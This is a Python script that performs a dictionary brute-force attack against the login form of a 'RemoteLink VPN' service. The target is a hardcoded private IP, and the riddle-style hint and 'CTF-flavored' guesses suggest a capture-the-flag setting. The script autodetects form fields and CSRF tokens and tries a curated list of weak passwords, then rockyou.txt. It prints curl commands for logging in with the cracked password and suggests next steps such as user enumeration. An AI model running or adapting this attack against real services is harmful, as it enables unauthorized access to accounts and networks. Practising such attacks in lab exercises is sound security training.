```python
#!/usr/bin/env python3
"""
brute_vpn.py — dictionary attack on RemoteLink VPN /login.

Hint: "Try the door all night — no lock slows a hand that reads Dictionary well."
→ no rate limiting, dictionary-based brute force.

Strategy:
  1. Autodetect the login form fields (and any CSRF/hidden tokens)
  2. Curated list (~70 guesses, ~2 s)
  3. rockyou.txt (~14.3M guesses) if curated misses
  4. Success detection by: 302→/dashboard, 'Sign out'/'dashboard' in body,
     or new session cookie set
"""
import argparse
import re
import sys
import time
from pathlib import Path

import requests

BASE     = "http://10.110.3.72:8072"
USERNAME = "vpnuser"
TMO      = 6


# ---------------------------------------------------------------------------
# Form discovery
# ---------------------------------------------------------------------------
def fetch_form_fields(session):
    """GET /login, return (user_field, pass_field, hidden_fields)."""
    r = session.get(f"{BASE}/login", timeout=TMO)
    html = r.text
    fields = {}
    for m in re.finditer(r"<input\b([^>]*)>", html, re.I):
        attrs = m.group(1)
        n = re.search(r'\bname=["\']([^"\']+)["\']', attrs, re.I)
        if not n:
            continue
        t = re.search(r'\btype=["\']([^"\']+)["\']', attrs, re.I)
        v = re.search(r'\bvalue=["\']([^"\']*)["\']', attrs, re.I)
        fields[n.group(1)] = {
            "type":  (t.group(1).lower() if t else "text"),
            "value": (v.group(1) if v else ""),
        }
    print(f"[*] Detected fields:")
    for k, v in fields.items():
        print(f"      {k:<20} type={v['type']:<10} value={v['value'][:40]!r}")

    user_field = next((n for n, a in fields.items()
                       if a["type"] in ("text", "email", "username")), None)
    pass_field = next((n for n, a in fields.items()
                       if a["type"] == "password"), None)
    hidden = {n: a["value"] for n, a in fields.items()
              if a["type"] == "hidden"}

    if not user_field or not pass_field:
        print("[!] Could not autodetect; defaulting to username/password")
        user_field = user_field or "username"
        pass_field = pass_field or "password"

    if hidden:
        print(f"[*] Hidden fields (CSRF?): {list(hidden)}")
    return user_field, pass_field, hidden


# ---------------------------------------------------------------------------
# One attempt
# ---------------------------------------------------------------------------
def attempt(session, uf, pf, hidden, password, fresh_form=False):
    """
    Returns (success: bool, status, signal: str, response).
    If fresh_form is True, re-fetch /login first to refresh any CSRF token.
    """
    if fresh_form and hidden:
        try:
            _, _, hidden = fetch_form_fields(session)
        except Exception:
            pass

    data = dict(hidden)
    data[uf] = USERNAME
    data[pf] = password

    try:
        r = session.post(f"{BASE}/login", data=data, timeout=TMO,
                         allow_redirects=False)
    except Exception as e:
        return False, None, f"ERR:{e}", None

    status = r.status_code
    body   = r.text or ""
    loc    = r.headers.get("Location", "")
    low    = body.lower()

    # 1. redirect = strongest signal
    if status in (301, 302, 303, 307):
        if "/login" in loc:
            return False, status, f"REDIR->{loc} (back to login)", r
        return True, status, f"REDIR->{loc}", r

    # 2. body markers
    if "sign out" in low or "logout" in low or "/dashboard" in low:
        return True, status, "BODY_DASHBOARD", r

    # 3. fallback: body contains an obvious failure hint → explicitly NOT success
    if any(w in low for w in ("invalid", "incorrect", "wrong password",
                              "authentication failed", "try again")):
        return False, status, "BODY_FAIL", r

    return False, status, "", r


# ---------------------------------------------------------------------------
# Wordlist driver
# ---------------------------------------------------------------------------
def run_wordlist(session, uf, pf, hidden, iterable, label,
                 progress_every=50, fresh_form=False):
    t0   = time.time()
    n    = 0
    last = ""
    for line in iterable:
        pw = line.rstrip("\r\n")
        if not pw:
            continue
        n += 1
        ok, status, sig, _ = attempt(session, uf, pf, hidden, pw,
                                     fresh_form=fresh_form)
        last = pw
        if ok:
            dt = time.time() - t0
            print(f"\n[+] *** SUCCESS ***  [{label}]  after {n} tries ({dt:.1f}s)")
            print(f"    password  = {pw!r}")
            print(f"    signal    = {sig}")
            return pw
        if n % progress_every == 0:
            rate = n / max(time.time() - t0, 0.01)
            print(f"    [{label}] {n} tried  ({rate:.0f}/s)  last={last!r}")
    dt = time.time() - t0
    print(f"    [{label}] exhausted {n} entries in {dt:.1f}s")
    return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--rockyou", default=str(Path.home() / "wordlists/rockyou.txt"))
    ap.add_argument("--skip-curated", action="store_true")
    ap.add_argument("--skip-rockyou", action="store_true")
    ap.add_argument("--delay", type=float, default=0.0,
                    help="sleep between requests (default: none — hint says no rate limit)")
    args = ap.parse_args()

    session = requests.Session()

    print("=" * 72)
    print(f"Target   : {BASE}/login")
    print(f"Username : {USERNAME}")
    print("=" * 72)

    uf, pf, hidden = fetch_form_fields(session)
    print(f"\n[*] Using user_field={uf!r}  pass_field={pf!r}")

    # ---------- Baseline: wrong password should NOT look like success ----------
    print(f"\n{'='*72}\nBASELINE (wrong password must NOT succeed)\n{'='*72}")
    ok, status, sig, resp = attempt(session, uf, pf, hidden,
                                    "definitely_wrong_pw_xyz_42_!!")
    print(f"    status={status}  success={ok}  signal={sig or '(none)'}")
    if ok:
        print("\n[!] Baseline wrong-password returned a SUCCESS signal.")
        print("    Detection logic is wrong. Dumping response body:\n")
        print((resp.text if resp else "")[:800])
        sys.exit(2)
    print("    → baseline OK, detection is sound.\n")

    # ---------- Phase 1: curated ----------
    curated = [
        # password = username variants
        USERNAME, f"{USERNAME}123", f"{USERNAME}1", f"{USERNAME}!",
        USERNAME.upper(), USERNAME.capitalize(), f"{USERNAME}2024",
        f"{USERNAME}2025", f"{USERNAME}pass", f"{USERNAME}@123",
        # classic weak
        "password", "Password", "password123", "Password123", "password1",
        "admin", "admin123", "Admin123", "administrator",
        "123456", "12345678", "123456789", "1234567890",
        "qwerty", "qwerty123", "abc123", "letmein", "welcome",
        "welcome123", "monkey", "dragon", "master", "iloveyou",
        "sunshine", "princess", "football", "baseball", "superman",
        "trustno1", "shadow", "michael", "hunter", "jennifer",
        # VPN-flavored
        "vpn", "vpn123", "vpnpassword", "remotelink", "remotelink123",
        "remote", "remote123", "remoteaccess", "connect", "connect123",
        "vpnuser!", "vpn!user", "vpn2024", "vpn2025",
        # CTF-flavored
        "flag", "ctf", "changeme", "changeme123", "secret", "secret123",
        "letmein123", "test", "test123", "guest", "guest123",
        "default", "default123", "root", "toor", "sesame", "opensesame",
    ]
    if not args.skip_curated:
        print("=" * 72)
        print(f"PHASE 1 — curated list ({len(curated)} entries)")
        print("=" * 72)
        pw = run_wordlist(session, uf, pf, hidden, curated, "curated",
                          progress_every=25, fresh_form=bool(hidden))
        if pw:
            _report_success(pw)
            return
        if args.delay:
            time.sleep(args.delay)

    # ---------- Phase 2: rockyou ----------
    if args.skip_rockyou:
        print("\n[*] --skip-rockyou, stopping.")
        return
    rp = Path(args.rockyou)
    if not rp.exists():
        print(f"\n[-] rockyou not found at {rp}")
        print(f"    Download:")
        print(f"      mkdir -p ~/wordlists")
        print(f"      curl -L -o {rp} \\")
        print(f"        https://github.com/brannondorsey/naive-hashcat/"
              f"releases/download/data/rockyou.txt")
        sys.exit(1)

    print("=" * 72)
    print(f"PHASE 2 — rockyou.txt ({rp})")
    print("=" * 72)
    print("[*] 14.3M candidates.  At 30–60 tries/s this is ~5–10 minutes.")
    print("[*] Ctrl+C anytime; progress prints every 200 tries.")
    print()
    try:
        with open(rp, encoding="latin-1", errors="replace") as f:
            pw = run_wordlist(session, uf, pf, hidden, f, "rockyou",
                              progress_every=200, fresh_form=bool(hidden))
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        return

    if pw:
        _report_success(pw)
        return

    print("\n[-] No password found.")
    print("    Next moves:")
    print("      - Try username variants: 'vpnuser' may be seeded, but")
    print("        'admin'/'vpnadmin' might also work — re-run with --user")
    print("      - ffuf on /dashboard after fake cookie (unlikely here)")
    print("      - Try `/forgot` if it exists (user-enumeration like InboxNow)")
    print("      - Check /static/, /robots.txt, /sitemap.xml, /api/")


def _report_success(pw):
    print()
    print("=" * 72)
    print(f"CRACKED  →  password = {pw!r}")
    print("=" * 72)
    print(f"Next:")
    print(f"  curl -c /tmp/vpn.cookies -X POST {BASE}/login \\")
    print(f"       -d 'username=vpnuser&password={pw}'")
    print(f"  curl -b /tmp/vpn.cookies {BASE}/dashboard")


if __name__ == "__main__":
    main()
```
